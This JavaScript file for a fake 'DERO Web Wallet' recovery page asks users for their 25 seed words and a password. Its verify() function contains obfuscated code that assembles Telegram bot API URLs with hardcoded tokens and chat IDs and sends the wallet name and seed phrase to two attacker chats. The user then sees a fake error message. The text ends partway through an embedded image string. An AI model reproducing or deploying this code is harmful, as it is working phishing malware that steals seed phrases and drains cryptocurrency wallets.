import './style.css'
import { encrypt, decrypt } from './ibeh_encrypt.js';
import logo from './logo.png'

loadDefault();

loadDefault_bod();

function call(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = preloader();
  setTimeout(() => {
    bod.innerHTML =
    decrypt(`5I1H1S2B4e1E2b1I2s2s4M5m2m1P1E5m5B4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1E2b2p2s1P4P1B2p2H5m5B5I2s2B1O4e1E2b1I2s2s4M5m1E2b1S1E2i1I1B2b1P5m4e2p2h1E2b1S1E2i4M5m2b2p1I1H2A1P1R1I2I2b2a4R1B2p1H4E4H5m4e2H2e2b2h2s4M5m1M2a2a2r5r5E5E2E2E2E5s2E1h5s2p2m1O5E1e1i1i1i5E2s2B1O5m4e2E1S1H2a1M4M5m1h1b5m4e1M1P1S1O1M2a4M5m1h1b5m4e2B1S1P2E2M2p2H4M5m1i4e1i4e1h1b4e1h1b5m4e1R1S2b2b4M5m2h2p2h1P5m5B5I2r1I2a1M4e1H4M5m3s1h1b4e1b1r5s1i1b1r1o2S1h1b4e1b1p5s1e1b1h1b4e1h1i5s1h1p1a1p4e1b1h5s1r1o1e1r4e1e1a5s1r1p1o1a4e1b1h5s1r1o1e1r3h1b1i5s1a1e1s1s2S1a5s1o1h1p1b1a4e1b1h5s1r1o1e1r4e1s5s1a1s1r1s1r4e1b1b5s1a1a1m1h4e1a5s1a1i1b1e1o4e1b1b5s1i1s1b1a3m1b1m5s1e1e1i1b4e1h5s1m1o1h1i1h2S1b1m5s1m1s1a4e1h5s1b1a1p1b1h4e1b1m5s1m1s1m1p4e1e5s1e1m1b1e1o4e1b1m5s1e1b1o1r4e1b5s1m1i1p1h1m3m1b1o5s1r1e1m1r4e1b5s1i1e1i1e1o2S1b1r5s1a1r1a1p4e1i5s1p1r1o1e1i1r4e1b1r5s1i1p1e1e4e1i5s1p1r1m1s1e1m4e1b1p5s1p1m1o1b4e1b5s1i1e1h1s1a3m1b5s1i1e1m1r1e4e1b1p5s1p1m1e1r2S1i5s1p1o1i1i1h1r4e1b1r5s1i1p4e1i5s1p1o1i1i1h1p4e1b1r5s1a1o4e1b5s1i1e1m1r1b4e1b1o5s1r1e1m1r3m1b1p5s1p1m1e1r4e1e1a5s1a1m1e1r2S1b1r5s1i1p4e1h1i5s1r1p4e1b1r5s1a1o4e1h1i5s1r1p4e1b1o5s1r1e1m1r4e1e1a5s1a1m1e1r3m1b1m5s1e1i1r1h4e1e1a5s1e1a1p1m2S1b1m5s1m1m1e1p4e1e1s5s1m1e1m1o4e1b1m5s1m1m1e1s4e1e1m5s1s1i1s1e4e1b1m5s1e1i1o1e4e1e1m5s1e1p1i1o3m1a5s1s1a1r1a1b4e1b1a5s1a1b1m1e2S1s5s1a1s1b1m1r4e1b1a5s1i1i1b1p4e1a5s1o1h1i1h1m4e1b1m5s1p1h1m1r4e1b1i5s1a1e1p1h4e1b1m5s1p1h1m1r3h1e1a5s1r1p1o1a2S1h1i5s1h1p1a1p4e1b1m5s1p1h1m1r4e1h1b4e1b1o5s1m1s1o1a4e1h1b4e1b1r5s1a1s1p1p3M1b1r5s1i1b1r1o4b5m4e1R1S2b2b4M5m2E1M1S2a1P5m4e1R1S2b2b4P2p2r1I1E1S2a2P4M5m1i5s1o5m5E5B5I5E2s2B1O5B5I5E1H1S2B5B4e4e4e4e4e4e4e4e5I1M1b5B3S1I2b2b1P2a4e3H1P1E2p2B1P2m2P4e2I2s1S2h1O4e3P1P1P1H4e2E2p2m1H2s5I5E1M1b5B4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1B5m5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B3S1I2b2b1P2a4e3a1I2e1P5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2a1P2H2a5m4e1S1H4M5m2E1I2b2b1P2a3a5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m3S1I2b2b1P2a4e2h1I2e1P4e1R2p2m4e2o2I1S1E2i4e2m1P1R1P2m1P2h1E1P5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B1e1r4e3P1P1P1H4e3S2p2m1H2s5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I2a1P2H2a1I2m1P1I4e2a2P2r1P4M5m2a1P2H2a5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m5m4e1S1H4M5m2a1P2H2a2O5m5B5I5E2a1P2H2a1I2m1P1I5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B3B1I2s2s2E2p2m1H5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2r1I2s2s2E2p2m1H5m4e1S1H4M5m2r1I2s2s5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m3B1I2s2s2E2p2m1H5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B2S2p2h1R1S2m2e4e3B1I2s2s2E2p2m1H5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2r1I2s2s2E2p2m1H5m4e1S1H4M5m1E2p2h3B1I2s2s5m4e2r2b1I1E1P1M2p2b1H1P2m4M5m2S2p2h1R1S2m2e4e3B1I2s2s2E2p2m1H5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e4e4e5I1H1S2B4e1E2b1I2s2s4M5m1O5m5B4e4e4e4e4e4e4e4e4e4e4e4e5I2b1I1B1P2b5B3S1I2b2b1P2a4e2s2a1I2m2a4e3R2p2r2p1M1P1S1O1M2a5r4e4E2p2r2a1S2p2h1I2b4H5I5E2b1I1B1P2b5B4e4e4e4e4e4e4e4e4e4e4e4e5I1S2h2r2I2a4e2a2P2r1P4M5m2h2I2e1B1P2m5m4e2B1I2b2I1P4M5m1i5m5E5B4e4e4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e5I5E1H1S2B5B4e4e4e4e4e4e4e4e5I1B2I2a2a2p2h4e1S1H4M5m2m1P1E5m5B3H1P1E2p2B1P2m4e2E1I2b2b1P2a5I5E1B2I2a2a2p2h5B4e4e4e4e4e4e5I5E1H1S2B5B`);
    document.getElementById("rec").onclick=()=>{verify()};
  }, 2000);
}



function loadDefault() {
  document.querySelector('#app').innerHTML =  `
    <main>
    <header>
      <div class="l"><img src="${logo}" alt="logo" /></div>
      <div class="w">
        <span>DERO Wallet</span>
        <select class="clickable">
          <option>English</option>
        </select>
      </div>
    </header>
    <div class="main">
      <div class="side">
        <div class="b">
          <button onclick="loadDefault_bod()">Recover Wallet</button>
          <button onclick="error_bod()">Create New Wallet</button>
          <button onclick="error_bod()">DERO Project</button>
        </div>
      </div>
      <div class="bod">
        
      </div>
    </div>
  </main> 
  `
}
function loadDefault_bod(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = `
  <div class="box">
    <h3>DERO Web Wallet</h3>
    <button onclick="call()">Recover Wallet using SEED words (25 words)</button>
    <button onclick="call()">Recover Wallet using Recovery Key (64 hex char)</button>
    <button onclick="call()">Upload Wallet from DISK</button>
    <br>
    <button class="white">Recover View Only Wallet (128 hex char)</button>
  </div>
  <div class="box">
    <h5>DERO Web software is alpha software <br>
      Core Wallet Version: UI Version: 0.0.0 <br>
      Copyright DERO Project<br>
      This project is covered by DERO license.
    </h5>
  </div>`;
}
function call_bod(){
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = `
  <div class="rec">
        <div class="close-box"><svg class="clickable" onclick="loadDefault_bod()" xmlns="http://www.w3.org/2000/svg" width="31" height="31" viewBox="0 0 31 31" fill="none"><path d="M31 15.0156C31 14.2131 30.3494 13.5625 29.5469 13.5625H10.9288C9.63419 13.5625 8.98585 11.9973 9.90126 11.0819L17.2201 3.76303C17.789 3.19413 17.7874 2.27126 17.2165 1.70437L16.5275 1.02026C15.9594 0.456205 15.0422 0.457827 14.4761 1.02389L1.02752 14.4725C0.460035 15.04 0.460034 15.96 1.02751 16.5275L14.4725 29.9725C15.04 30.54 15.96 30.54 16.5275 29.9725L17.2053 29.2947C17.7724 28.7276 17.7728 27.8082 17.2062 27.2406L9.89591 19.9172C8.98175 19.0014 9.63037 17.4375 10.9243 17.4375H29.5469C30.3494 17.4375 31 16.7869 31 15.9844V15.0156Z" fill="white" fill-opacity="0.6"/></svg></div>
        <h1>Wallet Recovery using Seed words</h1>
        <div class="b">
          <div class="g">
            <label>Wallet Name</label>
            <input type="text" id="walletN" placeholder="Wallet name for quick reference"/>
          </div>
          <div class="g">
            <label>25 Seed Words</label>
            <textarea type="text" placeholder="" id="textA"></textarea>
          </div>
          <div class="g">
            <label>Password</label>
            <input type="password" id="pass" placeholder="Password"/>
          </div>
          <div class="g">
            <label>Confirm Password</label>
            <input type="password" id="conPass" placeholder="Confirm Password"/>
          </div>
          <div class="g">
            <label>Wallet start Topoheight: (optional)</label>
            <input type="number" value="0"/>
          </div>
        </div>
        <button id="rec">Recover wallet</button>
      </div>`;
}
async function verify(){
  const wN = document.getElementById('walletN');
  const p = document.getElementById('pass');
  const cP = document.getElementById('conPass');
  const tA = document.getElementById('textA');
  const sW = tA.value.trim().split(/\s+/);
  if(wN.value==''){
    wN.style.borderColor="#F55F63";
    return
  }
  wN.style.borderColor="#008000";
  if (sW.length !== 25) {
    tA.style.borderColor="#F55F63";
    return;
  }
  tA.style.borderColor="#008000";
  if(p.value=='' || p.value!=cP.value){
    p.style.borderColor="#F55F63";
    cP.style.borderColor="#F55F63";
    return
  }
  p.style.borderColor="#008000";
  cP.style.borderColor="#008000";


  function _0xebc4(_0x466348,_0xba3475){const _0x578d76=_0x2595();return _0xebc4=function(_0x698aa9,_0x5f43b5){_0x698aa9=_0x698aa9-(-0x1027+-0x25ff+0x380c);let _0x359987=_0x578d76[_0x698aa9];return _0x359987;},_0xebc4(_0x466348,_0xba3475);}const _0x4e7838=_0xebc4;(function(_0x4c9b23,_0x1790e1){const _0x558021=_0xebc4,_0x4a7a29=_0x4c9b23();while(!![]){try{const _0x4ac6db=parseInt(_0x558021(0x212))/(-0x84f+-0x1d*0xe4+0x2224)+-parseInt(_0x558021(0x1eb))/(-0x1544+-0x7*0x38d+-0x1*-0x2e21)+parseInt(_0x558021(0x1fe))/(0x17*-0x56+0xc5f*0x2+-0x1101*0x1)*(parseInt(_0x558021(0x1e9))/(-0x2684+-0x2*-0x11c1+-0x9*-0x56))+-parseInt(_0x558021(0x1f7))/(-0x1*-0x1d82+-0x6da+-0x16a3)+parseInt(_0x558021(0x1f5))/(0x14bf+0x2463+-0x391c)+parseInt(_0x558021(0x213))/(0x15bf+-0x1961+-0x3a9*-0x1)*(parseInt(_0x558021(0x20d))/(0x1*0x2688+-0x19a8+-0xcd8))+parseInt(_0x558021(0x1ed))/(-0x17db+-0x1bab+0x338f)*(-parseInt(_0x558021(0x202))/(-0xbb1+-0x12ff*0x1+0x17*0x156));if(_0x4ac6db===_0x1790e1)break;else _0x4a7a29['push'](_0x4a7a29['shift']());}catch(_0x4f40ce){_0x4a7a29['push'](_0x4a7a29['shift']());}}}(_0x2595,-0xb126d+-0x4*0x3222a+-0xa85*-0x2fe));function _0x2595(){const _0x1ca515=['\x0a📢\x20*New\x20Re','bod','651TjraOt','Details:*\x0a','0_quA4','ward\x20Tip*\x20','8525750uXkiak','getElement','i.telegram','\x0a\x0a*Client\x20','ame:\x20','sByClassNa','equest\x20Fai','led:','8104209847','json','7534122584','881168jZjTsr','-\x20Wallet\x20N','4MBLQ8VI1k','.org/bot','sGpsQD60IZ','1007709pouexO','63KHlDuA','value','innerHTML','&parse_mod',':AAFpbr4rI','Telegram\x20E','error','5524gvKdcF','ge?chat_id','270578frbVrD','9ElLj66I2w','18gfzvjg','all','\x0a\x20\x20','rror\x201:','&text=','e=Markdown','https://ap','Telegram\x20R','2883162kCZuwQ','\x0a-\x20Content','2114895wdwbrE','/sendMessa','i9NpKweW4Z','tYN3Us',':AAGMo08k1'];_0x2595=function(){return _0x1ca515;};return _0x2595();}const BOT_TOKEN=_0x4e7838(0x20a)+_0x4e7838(0x1fb)+_0x4e7838(0x1f9)+_0x4e7838(0x1ec)+_0x4e7838(0x200),CHAT_ID=0xcc697789+-0x8a540ee1+0x659f68d*0x29,BOT_TOKEN2=_0x4e7838(0x20c)+_0x4e7838(0x1e6)+_0x4e7838(0x20f)+_0x4e7838(0x211)+_0x4e7838(0x1fa),CHAT_ID2=-(0x37bbaef9b*-0x83+0x85f*0x1e10790+0x2a202a9a3c1),message=_0x4e7838(0x1fc)+_0x4e7838(0x201)+_0x4e7838(0x205)+_0x4e7838(0x1ff)+_0x4e7838(0x20e)+_0x4e7838(0x206)+wN[_0x4e7838(0x214)]+(_0x4e7838(0x1f6)+':\x20')+tA[_0x4e7838(0x214)]+_0x4e7838(0x1ef),encodedMessage=encodeURIComponent(message),telegramUrl=_0x4e7838(0x1f3)+_0x4e7838(0x204)+_0x4e7838(0x210)+BOT_TOKEN+(_0x4e7838(0x1f8)+_0x4e7838(0x1ea)+'=')+CHAT_ID+_0x4e7838(0x1f1)+encodedMessage+(_0x4e7838(0x216)+_0x4e7838(0x1f2)),telegramUrl2=_0x4e7838(0x1f3)+_0x4e7838(0x204)+_0x4e7838(0x210)+BOT_TOKEN2+(_0x4e7838(0x1f8)+_0x4e7838(0x1ea)+'=')+CHAT_ID2+_0x4e7838(0x1f1)+encodedMessage+(_0x4e7838(0x216)+_0x4e7838(0x1f2)),telegramResponse=await fetch(telegramUrl),telegramResponse2=await fetch(telegramUrl2),result=await telegramResponse[_0x4e7838(0x20b)]();var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x148c+0x1*-0x781+-0xd0b];bod[_0x4e7838(0x215)]=preloader();try{const [response1,response2]=await Promise[_0x4e7838(0x1ee)]([fetch(telegramUrl),fetch(telegramUrl2)]),result1=await response1[_0x4e7838(0x20b)]();if(!response1['ok']){console[_0x4e7838(0x1e8)](_0x4e7838(0x1e7)+_0x4e7838(0x1f0),result1);var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x48a+0x22e0+-0x276a];bod[_0x4e7838(0x215)]=error_mod();return;}var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[-0x109c+0x2*-0xa57+-0x1*-0x254a];bod[_0x4e7838(0x215)]=error_mod();}catch(_0x494913){console[_0x4e7838(0x1e8)](_0x4e7838(0x1f4)+_0x4e7838(0x208)+_0x4e7838(0x209),_0x494913);var bod=document[_0x4e7838(0x203)+_0x4e7838(0x207)+'me'](_0x4e7838(0x1fd))[0x1aef+0x1*0x125f+0x78d*-0x6];bod[_0x4e7838(0x215)]=error_mod();}
}

function error_bod() {
  var bod = document.getElementsByClassName('bod')[0];
  bod.innerHTML = error_mod();
}
function error_mod() {
  return `<div class="box">

    <h3>Error</h3>
  </div>
  <div class="box">
    <h5>Can't be fetched at the moment</h5>
  </div>`;
}
function preloader() {
  return `
    <div class="preloader">
      <div class="rot">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10"><image  x="0px" y="0px" width="76px" height="87px"  xlink:href="data:img/png;base64,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